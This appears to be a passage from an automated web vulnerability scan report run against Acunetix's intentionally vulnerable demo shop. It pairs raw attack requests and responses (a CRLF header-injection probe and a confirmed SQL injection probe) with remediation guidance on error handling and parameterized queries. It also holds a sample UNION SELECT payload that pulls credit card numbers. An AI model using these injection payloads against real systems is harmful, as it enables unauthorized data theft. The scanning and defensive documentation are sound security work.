he seeks actually exists.  Have consistent terminology for files and folders that do exist, do not exist, and which have read access denied.  </li><br /><li><b>Informational Error Messages: </b> Ensure that error messages do not reveal too much information.  Complete or partial paths, variable and file names,  
row and column names in tables, and specific database errors should never be revealed to the end user. Remember, an attacker will gather as much information  
as possible, and then add pieces of seemingly innocuous information together to craft a method of attack.</li><br /><li><b>Proper Error Handling: </b> Utilize generic error pages and error handling logic to inform end users of potential problems. Do not provide system  
information or other data that could be utilized by an attacker when orchestrating an attack. </li><br /><li><b>Stored Procedures: </b> Consider using stored procedures. They require a very specific parameter format, which makes them less susceptible to SQL Injection  
attacks.  </li><br /><li><b>Database Privileges:  </b>  Utilize a least-privileges scheme for the database application.  Ensure that user accounts only have the limited functionality  
that is actually required.  All database mechanisms should deny access until it has been granted, not grant access until it has been denied. </li><br /></ul><br /><br /><b>For QA: </b><br /><br />

In reality, simple testing can usually determine how your web application will react to different input errors.  More expansive testing must be conducted to cause internal errors to gauge the reaction of the site. If the unhandled exception occurs in a piece of in-house developed software, consult the developer. If it is in a commercial package, contact technical support.<br /><br />


The best course of action for QA associates to take is to ensure that the error handling scheme is consistent.  Do you receive a different type of error for a file that does not exist as opposed to a file that does? Are phrases like "Permission Denied" utilized which could reveal the existence of a file to an attacker?]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Apache:</b><br /><a href="http://httpd.apache.org/docs/1.3/custom-error.html">Apache HTTP Server Version 1.3 Custom Error Responses</a><br /><a href="http://httpd.apache.org/docs/2.0/custom-error.html">Apache HTTP Server Version 2.0 Custom Error Responses</a><br /><br /><b>Microsoft:</b><br /><a href="http://support.microsoft.com/kb/318380">Description of Microsoft Internet Information Services (IIS) 5.0 and 6.0 status codes</a><br /><a href="https://vulncat.fortify.com/en/weakness?q=SQL%20Injection">SQL Injection</a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[The most common cause of an unhandled exception is a failure to properly sanitize client-supplied data that is used in SQL statements. They can also be caused by a bug in the web application's database communication code, a misconfiguration of database connection settings, an unavailable database, or any other reason that would cause the application's database driver to be unable to establish a working session with the server. The problem is not that web applications generate errors. All web applications in their normal course of operation will at some point receive an unhandled exception. The problem lies not in that these errors were received, but rather in how they are handled. Any error handling solution needs to be well-designed, and uniform in how it handles errors. For instance, assume an attacker is attempting to access a specific file. If the request returns an error File not Found, the attacker can be relatively sure the file does not exist. However, if the error returns "Permission Denied," the attacker has a fairly good idea that the specific file does exist. This can be helpful to an attacker in many ways, from determining the operating system to discovering the underlying architecture and design of the application. <br /><br />
The error message may also contain the location of the file that contains the offending function. This may disclose the webroot's absolute path as well as give the attacker the location of application "include" files or database configuration information. A fundamental necessity for a successful attack upon your web application is reconnaissance. Database server error messages can provide information that can then be utilized when the attacker is formulating his next method of attack. It may even disclose the portion of code that failed.<br /><br />
Please note that this vulnerability may be a false positive if the page it is flagged on is technical documentation relating to a database server.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[The severity of this vulnerability depends on the reason the error message was generated. In most cases, it will be the result of the web application attempting to use an invalid client-supplied argument in a SQL statement, which means that SQL injection will be possible. If so, an attacker will at least be able to read the contents of the entire database arbitrarily. Depending on the database server and the SQL statement, deleting, updating and adding records and executing arbitrary commands may also be possible. If a software bug is responsible for triggering the error, the potential impact will vary, depending on the circumstances. The location of the application that caused the error can be useful in facilitating other kinds of attacks. If the file is a hidden or include file, the attacker may be able to gain more information about the mechanics of the web application, possibly even the source code. Application source code is likely to contain usernames, passwords, database connection strings and aids the attacker greatly in discovering new vulnerabilities.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[The Probability Score ranks the likelihood of an attack when all factors of potential success are taken into consideration, such as the amount of expertise necessary to exploit the vulnerability, its ease of exploitation, and what mitigating factors could potentially increase or decrease its rate of success.  For instance, does this attack rely on acquiring other information or gaining specific access to be successful, or can it be exploited by itself?  Are there automated attack tools that can increase its effectiveness, such as with SQL Injection?  Is the vulnerability hard to find, ala a buffer overflow?  Are similar exploits well publicized?]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed immediately.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Custom error messages can be disabled via the ASP.NET Web Site Administration Tool.  Choose Website | ASP.NET Configuration from the Visual Studio 2005 menu to display it.  Then select the Application tab and click on “Define default error page”.  Select “Specify a URL” and choose a page within your project in the tree control.
<br /><br />
The corresponding elements of web.config are shown below.  The attribute “mode” should never be set to “Off”. Instead, choose “On” to always use custom errors or “RemoteOnly” to allow diagnosis of issues from the web server console.<br /><br />
&lt;configuration&gt;<br />
    &lt;system.web&gt;<br />
        &lt;customErrors mode="RemoteOnly" defaultRedirect="GenericErrorPage.htm"&gt;<br />
        &lt;/customErrors&gt;<br />
    &lt;/system.web&gt;<br />
&lt;/configuration&gt;
<br /><br />The attribute “defaultRedirect” should contain the relative URL of an error page.<br /><br />
Consult MSDN for additional options within this element.  For instance, you can specify different error pages based on the HTTP error code, such as 404 “Not Found”.<br /><br />

The best method of preventing problems that might arise from error messages is to adopt secure programming techniques that prevent an attacker from discovering too much information about the architecture and design of your web application. The following recommendations can be used as a basis for that. <br /><br /><ul><li>Stringently define the data type (for instance, a string, an alphanumeric character, etc) that the application will accept. </li><li>Use what is good instead of what is bad. Validate input for improper characters. </li><li>Do not display error messages to the end user that provide information (such as table names) that could be utilized in orchestrating an attack. </li><li>Define the allowed set of characters. For instance, if a field is to receive a number, only let that field accept numbers. </li><li>Define the maximum and minimum data lengths for what the application will accept. </li><li>Specify acceptable numeric ranges for input </li></ul>Also, be sure that you have a consistent error handling mechanism that includes consideration of the following elements: <br /><br /><ul><li><b>Uniform Error Codes: </b>Ensure that you are not inadvertently supplying information to an attacker via the use of inconsistent or "conflicting" error messages. For instance, don't reveal unintended information by utilizing error messages such as Access Denied, which will also let an attacker know that the file he seeks actually exists. Have consistent terminology for files and folders that do exist, do not exist, and which have read access denied. </li><li><b>Informational Error Messages: </b>Ensure that error messages do not reveal too much information. Complete or partial paths, variable and file names, row and column names in tables, and specific database errors should never be revealed to the end user. Remember, an attacker will gather as much information as possible, and then add pieces of seemingly innocuous information together to craft a method of attack.</li><li><b>Proper Error Handling: </b>Utilize generic error pages and error handling logic to inform end users of potential problems. Do not provide system information or other data that could be utilized by an attacker when orchestrating an attack.</li></ul>]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />
Custom error messages should be enabled in the deployment descriptor file for the Java 2 Platform, Enterprise Edition (J2EE) Web application. The “error-page” element of web.xml specifies a mapping between an error code or exception type to the path of an error page resource in the Web application. <br /><br />
The following example shows how a SQL Exception can be mapped to a custom general-error page called “errorPage.jsp” in web.xml: <br /><br />
&lt;error-page&gt;<br />
  &lt;exception-type&gt;java.lang.SQLException&lt;/exception-type&gt;<br />
  &lt;location&gt;/errorPage.jsp&lt;/location&gt;<br />
&lt;/error-page&gt;<br /><br />
The following example shows how an HTTP error code can be mapped to custom general error page called “errorPage.jsp” in web.xml: <br /><br />
&lt;error-page&gt;<br />
  &lt;error-code&gt;404&lt;/error-code&gt;<br />
  &lt;location&gt;/errorPage.jsp&lt;/location&gt;<br />
&lt;/error-page&gt;<br /><br />
To handle runtime exceptions within a JSP page, each page should specify a custom error page in page directive as shown below: <br /><br />
&lt;%@ page errorPage="errorPage.jsp" %&gt;<br /><br />
Within a Java servlet code, you can catch a SQL exception, throw a new generic exception, and forward the request to the error page to show a generic exception as shown below: <br /><br />
request.setAttribute("javax.servlet.jsp.jspException", new <br />
  Exception("Generic Error Message"));<br />
RequestDispatcher rd = <br />
  getServletContext().getRequestDispatcher("/errorPage.jsp");<br />
rd.forward(request, response); <br /><br />
The best method of preventing problems that arise from error messages is to adopt secure programming techniques that prevent an attacker from discovering too much information about the architecture and design of your Web application. The following recommendations can be used as a basis for that. 
<ul><li>Stringently define the data type (a string, an alphanumeric character, etc) that the application will accept. </li><li>Use what is good instead of what is bad. Validate input for improper characters. </li><li>Do not display error messages to the end user that provide information (such as table names) that could be used in orchestrating an attack. </li><li>Define the allowed set of characters. For instance, if a field is to receive a number, allow that field to accept only numbers. </li><li>Define the maximum and minimum data lengths that the application will accept. </li><li>Specify acceptable numeric ranges for input </li></ul>
Also, be sure that you have a consistent error-handling mechanism that includes the following elements: 
<ul><li><b>Uniform Error Codes:</b> Ensure that you are not inadvertently supplying information to an attacker via the use of inconsistent or "conflicting" error messages. For instance, don't reveal unintended information by utilizing error messages such as Access Denied, which will also let an attacker know that the file he seeks actually exists. Have consistent terminology for files and folders that do exist, do not exist, and which have read access denied. </li><li><b>Informational Error Messages:</b> Ensure that error messages do not reveal too much information. Complete or partial paths, variable and file names, row and column names in tables, and specific database errors should never be revealed to the end user. Remember, an attacker will gather as much information as possible, and then add pieces of seemingly innocuous information together to craft a method of attack. </li><li><b>Proper Error Handling:</b> Use generic error pages and error handling logic to inform end users of potential problems. Do not provide system information or other data that could be used by an attacker when orchestrating an attack. </li></ul>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="4FD5C49B0257874F1499B14261052F7B"><![CDATA[GET /listproducts.php?cat=2%0d%0aSPIHeader:%20SPIValue HTTP/1.1
Referer: http://php.vulnweb.com/categories.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="4FD5C49B0257874F1499B14261052F7B";PSID="1EFA08AB9E8A0EC09F30D4E7F97ECBB5";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="90e84d4b-fe51-47a6-ace4-be01fbb9325c";AttackSequence="0";AttackParamDesc="cat";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="3582";Engine="Http+Response+Splitting";SmartMode="4";AttackString="2%250d%250aSPIHeader%3a%2520SPIValue";AttackStringProps="Attack";tid="64";tt="11";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="399b21ab";
X-Request-Memo: ID="925edba2";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:47:23 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4994

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SPIHeader: SPIValue' at line 2
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="4FD5C49B0257874F1499B14261052F7B"><Method>GET</Method><Path>/</Path><File>listproducts</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>cat=2%0d%0aSPIHeader:%20SPIValue</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>cat</Name><Value>2%0d%0aSPIHeader:%20SPIValue</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/categories.php</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="4FD5C49B0257874F1499B14261052F7B";PSID="1EFA08AB9E8A0EC09F30D4E7F97ECBB5";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="90e84d4b-fe51-47a6-ace4-be01fbb9325c";AttackSequence="0";AttackParamDesc="cat";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="3582";Engine="Http+Response+Splitting";SmartMode="4";AttackString="2%250d%250aSPIHeader%3a%2520SPIValue";AttackStringProps="Attack";tid="64";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="29";smi="0";sc="1";ID="399b21ab";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="925edba2";sc="1";tid="40";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SPIHeader: SPIValue' at line 2
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:47:23 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4994</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="B53573F49759607E57D851E3EBEAC49B"><URL>http://php.vulnweb.com:80/listproducts.php?cat=1%09and%09(select%09count(*)%09from%09spitable)%09%3d%091%09or%091%3d0%09</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>cat</AttackParamDescriptor><Issues><Issue id="971d0302-5350-49c1-a440-bfba2006ebbd"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5657</EngineType><AttackHTTPRequest><![CDATA[GET /listproducts.php?cat=1%09and%09(select%09count(*)%09from%09spitable)%09%3d%091%09or%091%3d0%09 HTTP/1.1
Referer: http://php.vulnweb.com/categories.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="B53573F49759607E57D851E3EBEAC49B";PSID="1CDF5B56CF311BF69D9675E793D2E81A";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="3";AttackParamDesc="cat";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="1%2509and%2509(select%2509count(*)%2509from%2509spitable)%2509%253d%25091%2509or%25091%253d0%2509";AttackStringProps="Attack";tid="43";tt="40";
X-RequestManager-Memo: sid="35";smi="0";sc="1";ID="fdf9a9d4";
X-Request-Memo: ID="dd697429";sc="1";tid="43";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>5658</VulnerabilityID><Severity>4</Severity><Name>SQL Injection (confirmed)</Name><Classifications><Classification kind="CWE" identifier="CWE-89" href="http://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="SQL Injection" href="https://vulncat.fortify.com/">SQL Injection</Classification></Classifications><DetectionSelection><Location offset="2275" length="37" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="sql.rgc" /><br /><drc_sqli />

Critical SQL Injection vulnerabilities have been identified in the web application. SQL injection is a method of attack where an attacker can exploit vulnerable code and the type of data an application will accept, and can be exploited in any application parameter that influences a database query. Examples include parameters within the url itself, post data, or cookie values. If successful, SQL Injection can give an attacker access to backend database contents, the ability to remotely execute system commands, or in some circumstances the means to take control of the server hosting the database. Recommendations include employing a layered approach to security that includes utilizing parameterized queries when accepting user input, ensuring that only expected data is accepted by an application, and hardening the database server to prevent data from being accessed inappropriately.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />Fundamentally, SQL Injection is an attack upon the web application, not the web server or the operating system itself. As the name implies, SQL Injection is the act of adding an unexpected SQL commands to a query, thereby manipulating the database in ways unintended by the database administrator or developer. When successful, data can be extracted, modified, inserted or deleted from database servers that are used by vulnerable web applications. In certain circumstances, SQL Injection can be utilized to take complete control of a system.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />Consider a login form for a web application. If the user input from the form is directly utilized to build a dynamic SQL statement, then there has been no input validation conducted, giving control to an attacker who wants access to the database. Basically, an attacker can use an input box to send their own request to the server, and then utilize the results in a malicious manner. This is a very typical scenario considering that HTML pages often use the POST command to send parameters to another ASP page.  
The number in bold might be supplied by the client in an HTTP GET or POST parameter, like in the following URL:<br /><br />

http://www.example.com/GetItemPrice?ItemNumber=<b>12345</b><br /><br />

In the example above, the client-supplied value, <b>12345</b>, is simply used as a numeric expression to indicate the item that the user wants to obtain the price of an item. The web application takes this value and inserts it into the SQL statement in between the single quotes in the WHERE clause.  However, consider the following URL:

<br /><br />http://www.example.com/GetItemPrice?ItemPrice?ItemNumber=0' UNION SELECT CreditCardNumber FROM Customers WHERE '1'='1<br /><br />

In this case, the client-supplied value has actually modified the SQL statement itself and 'injected' a statement of his or her choosing. Instead of the price of an item, this statement will retrieve a customer's credit card number.




]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />Each method of preventing SQL injection has its own limitations. Therefore, it is wise to employ a layered approach to preventing SQL injection, and implement several measures to prevent unauthorized access to your backend database. The following are recommended courses of action to take to prevent SQL Injection and Blind SQL Injection vulnerabilities from being exploited in your web application.<br /><br /><b>For Development:</b><br /><br />
Use the following recommendations to code web applications that are not susceptible to SQL Injection attacks. 
<ul><li><b>Parameterized Queries:</b> SQL Injection arises from an attacker’s manipulation of query data to modify query logic. The best method of preventing SQL Injection attacks is thereby to separate the logic of a query from its data. This will prevent commands inserted from user input from being executed. The downside of this approach is that it can have an impact on performance, albeit slight, and that each query on the site must be structured in this method for it to be completely effective. If one query is inadvertently bypassed, that could be enough to leave the application vulnerable to SQL Injection. The following code shows a sample SQL statement that is SQL injectable. <br /><br />

sSql = "SELECT LocationName FROM Locations ";<br />
sSql = sSql + " WHERE LocationID = " + Request["LocationID"];<br />
oCmd.CommandText = sSql;<br /><br />

The following example utilizes parameterized queries, and is safe from SQL Injection attacks. <br /><br />

sSql = "SELECT * FROM Locations ";<br />
sSql = sSql + " WHERE LocationID = @LocationID";<br />
oCmd.CommandText = sSql;<br />
oCmd.Parameters.Add("@LocationID", Request["LocationID"]);<br />

The application will send the SQL statement to the server without including the user’s input. Instead, a parameter-@LocationID- is used as a placeholder for that input. In this way, user input never becomes part of the command that SQL executes. Any input that an attacker inserts will be effectively negated. An error would still be generated, but it would be a simple data-type conversion error, and not something which a hacker could exploit. <br /><br />

The following code samples show a product ID being obtained from an HTTP query string, and used in a SQL query. Note how the string containing the “SELECT” statement passed to SqlCommand is simply a static string, and is not concatenated from input. Also note how the input parameter is passed using a SqlParameter object, whose name (“@pid”) matches the name used within the SQL query.<br /><br />

C# sample:<br /><br />
        string connString = WebConfigurationManager.ConnectionStrings["myConn"].ConnectionString;<br />
        using (SqlConnection conn = new SqlConnection(connString)) <br />
        { <br />
            conn.Open();<br />

            SqlCommand cmd = new SqlCommand("SELECT Count(*) FROM Products WHERE ProdID=@pid", conn); <br />

